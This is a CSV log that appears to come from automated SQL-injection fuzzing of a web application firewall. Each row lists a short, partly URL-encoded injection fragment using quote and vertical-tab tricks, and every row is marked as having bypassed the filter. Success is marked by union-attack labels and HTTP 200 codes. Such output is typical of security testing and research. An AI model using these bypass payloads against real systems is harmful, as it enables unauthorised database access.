Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0108,69.37,No,200
0'<@=.1+,Bypassed,No,None,Unknown,0.0115,69.83,No,500
0%27<@!=.1+,Bypassed,Yes,unionAtk,Unknown,0.0149,69.91,No,200
0%27or+,Bypassed,Yes,unionAtk,Unknown,0.0149,69.91,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0092,69.91,No,500
0'<@=.1+,Bypassed,No,None,Unknown,0.013,69.91,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0124,69.91,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0156,69.91,No,200
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0145,69.91,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0172,69.91,No,500
0'<@=.1%0b,Bypassed,No,None,Unknown,0.01,69.91,No,500
0'<@=1%0b,Bypassed,No,None,Unknown,0.0085,69.91,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0114,69.91,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0089,69.91,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0078,69.91,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.016,69.91,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0122,69.91,No,200
0'||%0b,Bypassed,No,None,Unknown,0.0126,69.91,No,500
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0102,69.91,No,200
0'<@=1.+,Bypassed,No,None,Unknown,0.0155,69.91,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0138,69.91,No,500
0%27<@!=1.+,Bypassed,Yes,unionAtk,Unknown,0.0139,69.91,No,200
0'<@=1.%0b,Bypassed,No,None,Unknown,0.012,69.91,No,500
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0074,69.91,No,200
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0092,69.91,No,200
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0134,69.91,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.01,69.91,No,500
0'<@!=1+,Bypassed,No,None,Unknown,0.0125,69.91,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.011,69.91,No,200
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.011,69.91,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0113,69.91,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0094,69.91,No,500
0'||%0b,Bypassed,No,None,Unknown,0.0128,69.91,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0108,69.91,No,200
0'<@=1%0b,Bypassed,No,None,Unknown,0.0184,69.91,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.011,69.91,No,500
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0158,69.91,No,200
0%27<@=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0099,69.91,No,200
0%27<@=1+,Bypassed,Yes,unionAtk,Unknown,0.0093,69.91,No,200
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0099,69.91,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0098,69.91,No,200
0'<@!=1.+,Bypassed,No,None,Unknown,0.0096,69.91,No,500
0%27<@=1.+,Bypassed,Yes,unionAtk,Unknown,0.0147,69.91,No,200
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0093,69.91,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0191,69.91,No,500
0'<@=1+,Bypassed,No,None,Unknown,0.0118,69.91,No,500
0'<@=1.%0b,Bypassed,No,None,Unknown,0.0077,69.91,No,500
0'or+,Bypassed,No,None,Unknown,0.0096,69.91,No,500
0'<@=1.+,Bypassed,No,None,Unknown,0.0091,69.91,No,500
0'<@!=.1%0b,Bypassed,No,None,Unknown,0.0097,69.91,No,500
0%27<@!=1+,Bypassed,Yes,unionAtk,Unknown,0.0156,69.5,No,200
0%27or%0b,Bypassed,Yes,unionAtk,Unknown,0.0188,69.83,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.016,69.91,No,500
0%27<@!=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0114,69.91,No,200
0%27<@=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0101,69.91,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.014,69.91,No,500
0%27<@=.1+,Bypassed,Yes,unionAtk,Unknown,0.0156,69.91,No,200
0'<@=.1%0b,Bypassed,No,None,Unknown,0.0138,69.91,No,500
0%27<@!=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0136,69.91,No,200
0'<@=.1+,Bypassed,No,None,Unknown,0.018,69.91,No,500
0%27or+,Bypassed,Yes,unionAtk,Unknown,0.0121,69.91,No,200
0'<@!=.1+,Bypassed,No,None,Unknown,0.0158,69.91,No,500
0'<@!=1.%0b,Bypassed,No,None,Unknown,0.0106,69.91,No,500
0'||%0b,Bypassed,No,None,Unknown,0.0109,69.91,No,500
0%27<@!=1.%0b,Bypassed,Yes,unionAtk,Unknown,0.0114,69.91,No,200
0%27<@=.1%0b,Bypassed,Yes,unionAtk,Unknown,0.0116,69.91,No,200
